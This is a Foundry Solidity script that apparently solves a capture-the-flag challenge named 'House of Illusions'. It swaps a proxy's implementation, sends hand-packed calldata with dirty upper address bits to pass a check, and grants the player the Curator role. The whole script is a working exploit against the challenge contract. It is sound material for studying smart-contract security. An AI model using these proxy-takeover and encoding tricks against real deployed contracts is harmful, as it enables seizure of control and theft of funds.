// SPDX-License-Identifier: MIT
pragma solidity 0.8.28;

import "forge-std/Script.sol";
import "src/IllusionHouse.sol";
import "src/MirrorProxy.sol";
import { IllusionHouse as IllusionHouseV1 } from "src/solution/IllusionHouse.sol";

interface IHouseOfIllusionsFactory {
    function createInstance() external payable;
    function getInstance(address player) external view returns (address);
}

contract HouseOfIllusionsScript is Script {
    function run() external {
        address challengeAddress = vm.envAddress("CHALLENGE");
        uint256 playerPk = vm.envUint("PRIVATE_KEY");
        address player = vm.addr(playerPk);

        vm.startBroadcast(playerPk);

        (address house, address patron, address targetVisitor) =
            _resolveTarget(challengeAddress, player);

        MirrorProxy proxy = MirrorProxy(payable(house));

        IllusionHouseV1 implementation = new IllusionHouseV1();
        proxy.reframe(address(implementation));

        bytes4 selector = bytes4(keccak256("admit(address,bytes)"));
        bytes32 sigil = bytes32("0xAnan or Tensai?");
        uint256 patronWord = uint256(uint160(patron)) | (1 << 160);

        bytes memory data = abi.encodePacked(
            selector,
            bytes32(patronWord),
            bytes32(uint256(0x20)),
            sigil
        );

        _callOrRevert(house, data);
        _callOrRevert(
            house,
            abi.encodeWithSignature("appointCurator(address)", targetVisitor)
        );
        require(
            IllusionHouse(house).roles(targetVisitor) ==
                IllusionHouse.Role.Curator,
            "not solved"
        );

        vm.stopBroadcast();
    }

    function _callOrRevert(address target, bytes memory data) private {
        (bool ok, bytes memory returndata) = target.call(data);
        if (!ok) {
            assembly {
                revert(add(returndata, 0x20), mload(returndata))
            }
        }
    }

    function _resolveTarget(address challenge, address player)
        private
        returns (address house, address patron, address targetVisitor)
    {
        (bool ok, bytes memory data) =
            challenge.staticcall(abi.encodeWithSignature("house()"));
        if (ok && data.length == 32) {
            house = abi.decode(data, (address));
            patron = house;
            (ok, data) =
                challenge.staticcall(abi.encodeWithSignature("VISITOR()"));
            if (ok && data.length == 32) {
                targetVisitor = abi.decode(data, (address));
            } else {
                targetVisitor = player;
            }
            return (house, patron, targetVisitor);
        }

        (ok, data) = challenge.staticcall(
            abi.encodeWithSignature("getInstance(address)", player)
        );
        if (ok && data.length == 32) {
            house = abi.decode(data, (address));
            if (house == address(0)) {
                uint256 value = vm.envOr("INSTANCE_VALUE", uint256(0));
                if (value == 0) {
                    IHouseOfIllusionsFactory(challenge).createInstance();
                } else {
                    IHouseOfIllusionsFactory(challenge).createInstance{
                        value: value
                    }();
                }
                house = IHouseOfIllusionsFactory(challenge).getInstance(player);
            }
            require(house != address(0), "instance missing");
            patron = house;
            targetVisitor = player;
            return (house, patron, targetVisitor);
        }

        (ok, data) = challenge.staticcall(
            abi.encodeWithSignature("roles(address)", player)
        );
        if (ok && data.length == 32) {
            house = challenge;
            patron = house;
            targetVisitor = player;
            return (house, patron, targetVisitor);
        }

        revert("unsupported challenge");
    }
}
